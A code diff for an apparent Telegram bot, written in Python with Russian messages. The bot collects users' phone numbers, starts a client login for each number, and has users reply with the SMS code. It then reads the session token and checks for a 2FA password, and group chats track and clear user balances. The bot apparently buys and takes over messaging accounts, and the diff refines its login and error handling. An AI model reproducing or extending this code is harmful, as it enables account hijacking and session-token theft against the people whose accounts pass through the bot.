@@ -456,11 +456,9 @@ async def code_timeout(user_id: int, phone: str):
 
 @dp.message()
 async def main_handler(msg: Message):
-    # СЛУЧАЙ 1: Команды — пропускаем
     if msg.text and msg.text.startswith("/"):
         return
 
-    # СЛУЧАЙ 2: Группа ждёт ID для чистки баланса
     if msg.chat.type in ("group", "supergroup") and msg.chat.id in expecting_balance_clear:
         if msg.text and msg.text.isdigit():
             user_id = int(msg.text.strip())
@@ -470,30 +468,24 @@ async def main_handler(msg: Message):
             await msg.answer(f"✅ Баланс пользователя {user_id} очищен")
             return
 
-    # СЛУЧАЙ 3: Группа — больше ничего не обрабатываем
     if msg.chat.type in ("group", "supergroup"):
         return
 
-    # Определяем, является ли сообщение номером телефона
     raw = msg.text.strip() if msg.text else ""
     digits = "".join(c for c in raw if c.isdigit())
     is_phone = len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8"))
 
-    # СЛУЧАЙ 4: Это код ответом на инструкцию (не номер)
     if msg.from_user.id in waiting_code and msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id and not is_phone:
         return await code_as_reply(msg)
 
-    # СЛУЧАЙ 5: Ждём код, но это не ответ и не номер — ошибка
     if msg.from_user.id in waiting_code and not is_phone:
         return await msg.answer(
             "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
         )
 
-    # СЛУЧАЙ 6: Не в режиме ожидания номера
     if msg.from_user.id not in expecting_phone:
         return
 
-    # СЛУЧАЙ 7: Обработка номера телефона
     if is_phone:
         if len(digits) == 11 and digits.startswith("7"):
             phone = "+" + digits
@@ -514,9 +506,17 @@ async def main_handler(msg: Message):
         )
 
         asyncio.create_task(run_client(msg, client, phone, sms_provider))
+        return
 
+    if msg.text:
+        await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")
+
+async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
+    try:
         await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
         await asyncio.sleep(1.5)
+
+        await client.start()
 
         waiting_code[msg.from_user.id] = True
         instruction_msg = await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
@@ -530,15 +530,6 @@ async def main_handler(msg: Message):
         })
 
         asyncio.create_task(code_timeout(msg.from_user.id, phone))
-        return
-
-    # СЛУЧАЙ 8: Не удалось распознать
-    if msg.text:
-        await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")
-
-async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
-    try:
-        await client.start()
 
         token = read_token_from_session(phone)
         if token:
@@ -561,6 +552,8 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
                 logger.info(f"Пароль 2FA уже стоит на {phone}")
 
     except Exception as e:
+        waiting_code.pop(msg.from_user.id, None)
+        pending.pop(msg.from_user.id, None)
         error_text = str(e).lower()
         error_name = type(e).__name__.lower()
 
@@ -568,6 +561,8 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
             await msg.answer("❌ На номере включена двухфакторная аутентификация. Авторизация невозможна. Повторная попытка через 7 дней")
         elif "blocked" in error_text or "recovery" in error_text:
             await msg.answer("❌ Номер заблокирован или удалён. Восстановлению не подлежит, используйте другой номер")
+        elif "limit" in error_text or "violate" in error_text or "слишком много попыток" in error_text:
+            await msg.answer("❌ Слишком много попыток авторизации для этого номера")
         elif "auth" in error_name or "code" in error_text or "token" in error_text:
             await msg.answer("❌ Неверный код подтверждения. Проверьте правильность ввода и повторите попытку")
         elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
